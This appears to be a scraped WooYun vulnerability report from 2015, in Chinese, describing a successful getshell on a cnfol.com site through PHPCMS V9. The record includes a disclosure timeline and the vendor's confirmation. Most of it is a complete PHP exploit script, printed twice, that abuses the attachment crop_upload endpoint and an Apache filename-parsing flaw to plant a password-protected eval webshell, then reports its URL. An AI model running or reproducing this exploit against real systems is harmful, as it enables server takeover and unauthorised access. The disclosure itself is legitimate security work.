{"id": 65418, "wybug_id": "wooyun-2015-0134593", "wybug_title": "中金在线某站Getshell", "wybug_corp": "福建中金在线网络股份有限公司", "wybug_author": "路人甲", "wybug_date": "2015-08-17 09:33", "wybug_open_date": "2015-10-01 10:36", "wybug_type": "成功的入侵事件", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-17：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-27：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-06：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-16：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-01：\t细节向公众公开  简要描述： RT 详细说明：  问题站点：http://tx.cnfol.com\n\nPHPCMS V9 找个exp getshell\n<?phperror_reporting(E_ERROR);set_time_limit(0);$pass=\"ln\";print_r('+---------------------------------------------------------------------------+PHPCms V9 GETSHELL 0DAY code by L.N.apache 适用(利用的apache的解析漏洞)+---------------------------------------------------------------------------+');if ($argc < 2) {print_r('+---------------------------------------------------------------------------+Usage: php '.$argv[0].' url pathExample: \t1.php '.$argv[0].' lanu.sinaapp.com\t2.php '.$argv[0].' lanu.sinaapp.com /phpcms+---------------------------------------------------------------------------+');exit;}$url = $argv[1];$path = $argv[2];$phpshell = '<?php @eval($_POST[\\''.$pass.'\\']);?>';$file = '1.thumb_.Php.JPG%20%20%20%20%20%20%20Php';if($ret=Create_dir($url,$path)){\t//echo $ret;\t$pattern = \"|Server:[^,]+?|U\";\tpreg_match_all($pattern, $ret, $matches);\tif($matches[0][0])\t{\t\tif(strpos($matches[0][0],'Apache') == false)\t\t{\t\t\techo \"\\n亲！此网站不是apache的网站。\\n\";exit;\t\t}\t}\t$ret = GetShell($url,$phpshell,$path,$file);\t$pattern = \"|http:\\/\\/[^,]+?\\.,?|U\";\tpreg_match_all($pattern, $ret, $matches);\tif($matches[0][0])\t{\t\techo \"\\n\".'密码为: '.$pass.\"\\n\";\t\techo \"\\r\\nurl地址: \".$matches[0][0].'JPG%20%20%20%20%20%20%20Php'.\"\\n\";exit;\t}\telse\t{\t\t\t$pattern = \"|\\/uploadfile\\/[^,]+?\\.,?|U\";\t\tpreg_match_all($pattern, $ret, $matches);\t\tif($matches[0][0])\t\t{\t\t\techo \"\\n\".'密码为: '.$pass.\"\\n\";\t\t\techo \"\\r\\nurl地址:\".'http://'.$url.$path.$matches[0][0].'JPG%20%20%20%20%20%20%20Php'.\"\\n\";exit;\t\t}\t\telse\t\t{\t\t\techo \"\\r\\n没得到！\\n\";exit;\t\t}\t\t\t}}function GetShell($url,$shell,$path,$js){    $content =$shell;    $data = \"POST \".$path.\"/index.php?m=attachment&c=attachments&a=crop_upload&width=6&height=6&file=http://\".$url.$path.\"/uploadfile/\".$js.\" HTTP/1.1\\r\\n\";     $data .= \"Host: \".$url.\"\\r\\n\";    $data .= \"User-Agent: Mozilla/5.0 (Windows NT 5.2; rv:5.0.1) Gecko/20100101 Firefox/5.0.1\\r\\n\";    $data .= \"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n\";    $data .= \"Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3\\r\\n\";    $data .= \"Connection: close\\r\\n\";    $data .= \"Content-Length: \".strlen($content).\"\\r\\n\\r\\n\";    $data .= $content.\"\\r\\n\";    $ock=fsockopen($url,80);    if (!$ock) \t{        echo \"\\n\".\"此网站没有回应,检测url是否输入正确\".\"\\n\";exit;    }\telse\t{\t\tfwrite($ock,$data);\t\t$resp = '';\t\twhile (!feof($ock)) \t\t{\t\t\t$resp.=fread($ock, 1024);\t\t}\t\treturn $resp;\t}}function Create_dir($url,$path=''){    $content ='I love you';    $data = \"POST \".$path.\"/index.php?m=attachment&c=attachments&a=crop_upload&width=6&height=6&file=http://lanu.sinaapp.com/1.jpg HTTP/1.1\\r\\n\";     $data .= \"Host: \".$url.\"\\r\\n\";    $data .= \"User-Agent: Mozilla/5.0 (Windows NT 5.2; rv:5.0.1) Gecko/20100101 Firefox/5.0.1\\r\\n\";    $data .= \"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n\";    $data .= \"Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3\\r\\n\";    $data .= \"Connection: close\\r\\n\";    $data .= \"Content-Length: \".strlen($content).\"\\r\\n\\r\\n\";    $data .= $content.\"\\r\\n\";    $ock=fsockopen($url,80);    if (!$ock) \t{        echo \"\\n\".\"此网站没有回应,检测url是否输入正确\".\"\\n\";exit;    }\tfwrite($ock,$data);    $resp = '';    while (!feof($ock)) \t{        $resp.=fread($ock, 1024);    }\treturn $resp;}?>\n\n\n\n\n   漏洞证明：  问题站点：http://tx.cnfol.com\n\nPHPCMS V9 找个exp getshell\n<?phperror_reporting(E_ERROR);set_time_limit(0);$pass=\"ln\";print_r('+---------------------------------------------------------------------------+PHPCms V9 GETSHELL 0DAY code by L.N.apache 适用(利用的apache的解析漏洞)+---------------------------------------------------------------------------+');if ($argc < 2) {print_r('+---------------------------------------------------------------------------+Usage: php '.$argv[0].' url pathExample: \t1.php '.$argv[0].' lanu.sinaapp.com\t2.php '.$argv[0].' lanu.sinaapp.com /phpcms+---------------------------------------------------------------------------+');exit;}$url = $argv[1];$path = $argv[2];$phpshell = '<?php @eval($_POST[\\''.$pass.'\\']);?>';$file = '1.thumb_.Php.JPG%20%20%20%20%20%20%20Php';if($ret=Create_dir($url,$path)){\t//echo $ret;\t$pattern = \"|Server:[^,]+?|U\";\tpreg_match_all($pattern, $ret, $matches);\tif($matches[0][0])\t{\t\tif(strpos($matches[0][0],'Apache') == false)\t\t{\t\t\techo \"\\n亲！此网站不是apache的网站。\\n\";exit;\t\t}\t}\t$ret = GetShell($url,$phpshell,$path,$file);\t$pattern = \"|http:\\/\\/[^,]+?\\.,?|U\";\tpreg_match_all($pattern, $ret, $matches);\tif($matches[0][0])\t{\t\techo \"\\n\".'密码为: '.$pass.\"\\n\";\t\techo \"\\r\\nurl地址: \".$matches[0][0].'JPG%20%20%20%20%20%20%20Php'.\"\\n\";exit;\t}\telse\t{\t\t\t$pattern = \"|\\/uploadfile\\/[^,]+?\\.,?|U\";\t\tpreg_match_all($pattern, $ret, $matches);\t\tif($matches[0][0])\t\t{\t\t\techo \"\\n\".'密码为: '.$pass.\"\\n\";\t\t\techo \"\\r\\nurl地址:\".'http://'.$url.$path.$matches[0][0].'JPG%20%20%20%20%20%20%20Php'.\"\\n\";exit;\t\t}\t\telse\t\t{\t\t\techo \"\\r\\n没得到！\\n\";exit;\t\t}\t\t\t}}function GetShell($url,$shell,$path,$js){    $content =$shell;    $data = \"POST \".$path.\"/index.php?m=attachment&c=attachments&a=crop_upload&width=6&height=6&file=http://\".$url.$path.\"/uploadfile/\".$js.\" HTTP/1.1\\r\\n\";     $data .= \"Host: \".$url.\"\\r\\n\";    $data .= \"User-Agent: Mozilla/5.0 (Windows NT 5.2; rv:5.0.1) Gecko/20100101 Firefox/5.0.1\\r\\n\";    $data .= \"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n\";    $data .= \"Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3\\r\\n\";    $data .= \"Connection: close\\r\\n\";    $data .= \"Content-Length: \".strlen($content).\"\\r\\n\\r\\n\";    $data .= $content.\"\\r\\n\";    $ock=fsockopen($url,80);    if (!$ock) \t{        echo \"\\n\".\"此网站没有回应,检测url是否输入正确\".\"\\n\";exit;    }\telse\t{\t\tfwrite($ock,$data);\t\t$resp = '';\t\twhile (!feof($ock)) \t\t{\t\t\t$resp.=fread($ock, 1024);\t\t}\t\treturn $resp;\t}}function Create_dir($url,$path=''){    $content ='I love you';    $data = \"POST \".$path.\"/index.php?m=attachment&c=attachments&a=crop_upload&width=6&height=6&file=http://lanu.sinaapp.com/1.jpg HTTP/1.1\\r\\n\";     $data .= \"Host: \".$url.\"\\r\\n\";    $data .= \"User-Agent: Mozilla/5.0 (Windows NT 5.2; rv:5.0.1) Gecko/20100101 Firefox/5.0.1\\r\\n\";    $data .= \"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n\";    $data .= \"Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3\\r\\n\";    $data .= \"Connection: close\\r\\n\";    $data .= \"Content-Length: \".strlen($content).\"\\r\\n\\r\\n\";    $data .= $content.\"\\r\\n\";    $ock=fsockopen($url,80);    if (!$ock) \t{        echo \"\\n\".\"此网站没有回应,检测url是否输入正确\".\"\\n\";exit;    }\tfwrite($ock,$data);    $resp = '';    while (!feof($ock)) \t{        $resp.=fread($ock, 1024);    }\treturn $resp;}?>\n\n\n\n\n   修复方案：  补丁   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-08-17 10:34 厂商回复： 谢谢，我们会立即处理漏洞。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}